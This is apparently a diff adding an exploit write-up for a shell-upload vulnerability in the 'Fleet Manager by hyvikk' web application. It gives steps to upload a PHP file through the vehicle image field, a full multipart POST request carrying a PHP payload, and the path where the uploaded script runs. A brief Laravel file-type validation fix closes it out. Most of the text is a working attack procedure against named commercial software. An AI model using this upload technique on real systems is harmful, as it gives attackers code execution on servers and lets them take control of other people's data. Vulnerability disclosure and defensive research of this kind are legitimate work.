@@ -1,0 +1,122 @@
+========================================================================================                  
+| Fleet Manager hyvikk Shell Upload
+  # Date: 29-04-2019
+  # Title    : Fleet Manager by hyvikk All versions                  
+| # Author   : saxgy1331  - Kaieteur-Falls-1331                                                                           
+| # Vendor Homepage:  https://codecanyon.net/item/fleet-manager/20051839                     
+| # Tested on: Windows, Linux 
+| # Bug      : Shell upload                                                                     
+======================  =================================
+ # Exploit  : 
+ 
+You can upload a php shell file as a vehicle image
+
+http://localhost/delivery/public/vehicles/create   
+
+After uploading the image you the shell will be saved in the /uploads/ folder with the id code 
+go  http://localhost/delivery/public/vehicles/ right click on the recent "php shell photo" you have uploaded Boom!
+
+POST /good/vehicles HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:66.0) Gecko/20100101 Firefox/66.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/good/vehicles/create
+Content-Type: multipart/form-data; boundary=---------------------------191691572411478
+Content-Length: 1926
+Connection: keep-alive
+Cookie: PHPSESSID= ; XSRF-TOKEN= %3D%3D; laravel_session= 
+Upgrade-Insecure-Requests: 1
+
+ -----------------------------191691572411478
+ Content-Disposition: form-data; name="_token"
+
+ 9gGkjP2AeqfijIpC6hH7TSxGDS7RAoily8pEdM9R
+ -----------------------------191691572411478
+ Content-Disposition: form-data; name="user_id"
+
+ 1
+ -----------------------------191691572411478
+ Content-Disposition: form-data; name="make"
+
+ test1234
+ -----------------------------191691572411478
+ Content-Disposition: form-data; name="model"
+
+ test12345
+ -----------------------------191691572411478
+ Content-Disposition: form-data; name="type"
+
+ Hatchback
+ -----------------------------191691572411478
+ Content-Disposition: form-data; name="year"
+
+ 5
+ -----------------------------191691572411478
+ Content-Disposition: form-data; name="int_mileage"
+
+ 3
+ -----------------------------191691572411478
+ Content-Disposition: form-data; name="vehicle_image"; filename="1331.php"
+ Content-Type: application/octet-stream
+
+ <?php
+ echo "1331";
+ ?>
+ -----------------------------191691572411478
+ Content-Disposition: form-data; name="reg_exp_date"
+
+ 2019-04-24
+ -----------------------------191691572411478
+ Content-Disposition: form-data; name="in_service"
+
+ 1
+ -----------------------------191691572411478
+ Content-Disposition: form-data; name="engine_type"
+
+ Petrol
+ -----------------------------191691572411478
+ Content-Disposition: form-data; name="horse_power"
+
+ 1
+ -----------------------------191691572411478
+ Content-Disposition: form-data; name="color"
+
+ green
+ -----------------------------191691572411478
+ Content-Disposition: form-data; name="vin"
+
+ 1
+ -----------------------------191691572411478
+ Content-Disposition: form-data; name="license_plate"
+
+ 1331
+ -----------------------------191691572411478
+ Content-Disposition: form-data; name="lic_exp_date"
+
+ 2019-04-23
+ -----------------------------191691572411478
+ Content-Disposition: form-data; name="group_id"
+
+ 1
+ -----------------------------191691572411478--
+ 
+ 
+Example  
+http://localhost/delivery/public/uploads/122030d1-ba55-4bfe-9533-44955d47b433.php  
+
+Fix
+
+public function uploadPhoto(Request $request)
+{
+    $this->validate($request, [
+        'photo' => 'mimes:jpeg,png,bmp,tiff |max:4096',
+    ],
+        $messages = [
+            'required' => 'The :attribute field is required.',
+            'mimes' => 'Only jpeg, png, bmp,tiff are allowed.'
+        ]
+    );
+ // Now save your file to the storage and file details at database.
+}
